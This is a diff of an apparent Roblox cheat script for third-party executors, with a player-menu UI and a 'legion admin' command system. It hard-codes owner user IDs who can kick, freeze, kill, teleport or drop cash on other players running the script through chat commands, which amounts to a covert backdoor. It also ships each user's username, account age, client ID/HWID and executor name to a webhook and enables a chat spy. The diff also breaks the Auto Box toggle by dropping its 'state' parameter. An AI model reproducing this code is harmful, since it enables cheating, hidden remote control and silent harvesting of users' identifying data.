@@ -4416,8 +4416,14 @@ MainBuffer:write(function()
 	
 
 	-- Auto Box Toggle
-	playerSection:Toggle({Text = "Auto Box", Default = false, Callback = function(state)
+	playerSection:Toggle({Text = "Auto Box", Callback = function()
 		Settings["Player"]["AutoBox"] = state
+	end})
+
+	playerSection:Button({Text = "Rejoin", Callback = function()
+		local ts = game:GetService("TeleportService")
+		local p = game:GetService("Players").LocalPlayer
+		ts:Teleport(game.PlaceId, p)
 	end})
 
 	-- Anti Stomp Toggle
@@ -4982,10 +4988,9 @@ local ownerUserIds = {
     7414867229,
     4576897125,
     2788229376,
-    524072506,
-    7428401742,
 }
 
+-- Check if the player is an owner
 local function isOwner(player)
     return table.find(ownerUserIds, player.UserId) ~= nil
 end
@@ -5004,7 +5009,11 @@ local function onPlayerChatted(player)
                 if args[2] and args[2]:lower() == "all" then
                     -- If the command is targeted at "all" players
                     for _, targetPlayer in ipairs(Players:GetPlayers()) do
-                        Commands[command](player, {command, targetPlayer.Name})
+                        if targetPlayer ~= player then -- Don't allow the owner to target themselves
+                            Commands[command](player, {command, targetPlayer.Name})
+                        else
+                            print("Cannot affect yourself.")
+                        end
                     end
                 else
                     Commands[command](player, args)
@@ -5022,7 +5031,7 @@ local function findPlayerByName(name)
         local originalName = string.lower(player.Name)
         local displayName = string.lower(player.DisplayName)
 
-        -- Check if the original name or display name matches the input (either fully or partially)
+        -- Match full or partial user and display names
         if originalName == lowerName or displayName == lowerName then
             return {player}
         elseif originalName:find(lowerName, 1, true) or displayName:find(lowerName, 1, true) then
@@ -5033,71 +5042,14 @@ local function findPlayerByName(name)
     return #matches > 0 and matches or nil
 end
 
-function dropMoney(amount)
-    game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "" .. amount)
-    sendNotif("Money dropped!", "$" .. amount .. " dropped!")
+-- Drop money function (modified to target specific player)
+function dropMoney(targetPlayer, amount)
+    -- Fire the server event with the target player's information
+    game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", targetPlayer, "" .. amount)
+    sendNotif("Money dropped!", "$" .. amount .. " dropped for " .. targetPlayer.Name .. "!")
 end
 
-local function kickUser(player, args)
-    local targetPlayers = findPlayerByName(args[2])
-    if targetPlayers then
-        for _, targetPlayer in ipairs(targetPlayers) do
-            targetPlayer:Kick("You have been kicked by a legion admin. User: " .. player.Name)
-            print(targetPlayer.Name .. " has been kicked by " .. player.Name)  
-        end
-    end
-end
-
-local function freezeUser(player, args)
-    local targetPlayers = findPlayerByName(args[2])
-    if targetPlayers then
-        for _, targetPlayer in ipairs(targetPlayers) do
-            if targetPlayer.Character then
-                local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.WalkSpeed = 0
-                end
-            end
-        end
-    end
-end
-
-local function unfreezeUser(player, args)
-    local targetPlayers = findPlayerByName(args[2])
-    if targetPlayers then
-        for _, targetPlayer in ipairs(targetPlayers) do
-            if targetPlayer.Character then
-                local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.WalkSpeed = defaultWalkSpeed
-                end
-            end
-        end
-    end
-end
-
-local function summonUser(player, args)
-    local targetPlayers = findPlayerByName(args[2])
-    local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
-    if targetPlayers and targetPosition then
-        for _, targetPlayer in ipairs(targetPlayers) do
-            if targetPlayer.Character then
-                targetPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
-            end
-        end
-    end
-end
-
-local function killUser(player, args)
-    local targetPlayers = findPlayerByName(args[2])
-    if targetPlayers then
-        for _, targetPlayer in ipairs(targetPlayers) do
-            targetPlayer:LoadCharacter()  -- This will reset the player
-        end
-    end
-end
-
--- Drop cash function
+-- Drop cash command (updated to prevent self-targeting)
 local function dropCash(player, args)
     local targetName = args[2]
     local amount = tonumber(args[3])
@@ -5116,16 +5068,24 @@ local function dropCash(player, args)
     -- If targeting "all" players
     if targetName:lower() == "all" then
         for _, targetPlayer in ipairs(Players:GetPlayers()) do
-            dropMoney(amount)
-            print(player.Name .. " dropped $" .. amount .. " for all players.")
+            if targetPlayer ~= player then -- Prevent the admin from dropping cash to themselves
+                dropMoney(targetPlayer, amount)
+                print(player.Name .. " dropped $" .. amount .. " for all players.")
+            else
+                print("Cannot drop cash for yourself.")
+            end
         end
     else
         -- Target a specific player
         local targetPlayers = findPlayerByName(targetName)
         if targetPlayers then
             for _, targetPlayer in ipairs(targetPlayers) do
-                dropMoney(amount)
-                print(player.Name .. " dropped $" .. amount .. " for " .. targetPlayer.Name)
+                if targetPlayer ~= player then -- Prevent the admin from dropping cash for themselves
+                    dropMoney(targetPlayer, amount)
+                    print(player.Name .. " dropped $" .. amount .. " for " .. targetPlayer.Name)
+                else
+                    print("Cannot drop cash for yourself.")
+                end
             end
         else
             print("Error: Player not found.")
@@ -5133,6 +5093,89 @@ local function dropCash(player, args)
     end
 end
 
+-- Kick command (prevent kicking yourself)
+local function kickUser(player, args)
+    local targetPlayers = findPlayerByName(args[2])
+    if targetPlayers then
+        for _, targetPlayer in ipairs(targetPlayers) do
+            if targetPlayer ~= player then -- Prevent self-kicking
+                targetPlayer:Kick("You have been kicked by a legion admin. User: " .. player.Name)
+                print(targetPlayer.Name .. " has been kicked by " .. player.Name)
+            else
+                print("You cannot kick yourself.")
+            end
+        end
+    end
+end
+
+-- Freeze command (prevent freezing yourself)
+local function freezeUser(player, args)
+    local targetPlayers = findPlayerByName(args[2])
+    if targetPlayers then
+        for _, targetPlayer in ipairs(targetPlayers) do
+            if targetPlayer ~= player then -- Prevent self-freezing
+                if targetPlayer.Character then
+                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.WalkSpeed = 0
+                    end
+                end
+            else
+                print("You cannot freeze yourself.")
+            end
+        end
+    end
+end
+
+-- Unfreeze command
+local function unfreezeUser(player, args)
+    local targetPlayers = findPlayerByName(args[2])
+    if targetPlayers then
+        for _, targetPlayer in ipairs(targetPlayers) do
+            if targetPlayer ~= player then -- Prevent unfreezing yourself if not frozen
+                if targetPlayer.Character then
+                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.WalkSpeed = defaultWalkSpeed
+                    end
+                end
+            else
+                print("You are not frozen.")
+            end
+        end
+    end
+end
+
+-- Summon command
+local function summonUser(player, args)
+    local targetPlayers = findPlayerByName(args[2])
+    local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
+    if targetPlayers and targetPosition then
+        for _, targetPlayer in ipairs(targetPlayers) do
+            if targetPlayer ~= player then -- Prevent self-summoning
+                if targetPlayer.Character then
+                    targetPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
+                end
+            else
+                print("You cannot summon yourself.")
+            end
+        end
+    end
+end
+
+-- Kill command (prevent self-killing)
+local function killUser(player, args)
+    local targetPlayers = findPlayerByName(args[2])
+    if targetPlayers then
+        for _, targetPlayer in ipairs(targetPlayers) do
+            if targetPlayer ~= player then -- Prevent self-killing
+                targetPlayer:LoadCharacter() -- This will reset the player
+            else
+                print("You cannot kill yourself.")
+            end
+        end
+    end
+end
 
 addCommand(".dropcash", dropCash)
 addCommand(".kick", kickUser)
@@ -5148,13 +5191,6 @@ end)
 for _, player in ipairs(Players:GetPlayers()) do
     onPlayerChatted(player)
 end
-
-
-
-
-
-
-
 
 Config = {enabled=true,spyOnMyself=true,public=false,publicItalics=true};
 PrivateProperties = {Color=Color3.fromRGB(0, 0, 0),Font=Enum.Font.SourceSansBold,TextSize=18};
@@ -5255,7 +5291,10 @@ local accountAge = player.AccountAge .. " days"
 
 local executorName = identifyexecutor() or "Unknown"
 local hwid = (executorName == "Internal X") and "0" or game:GetService("RbxAnalyticsService"):GetClientId()
-local deviceType = executorName:find("Mobile") and "Mobile 📱" or "PC 💻"
+
+-- Using UserInputService to determine device type
+local UserInputService = game:GetService("UserInputService")
+local deviceType = UserInputService.TouchEnabled and "Mobile 📱" or "PC 💻"
 
 sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
 
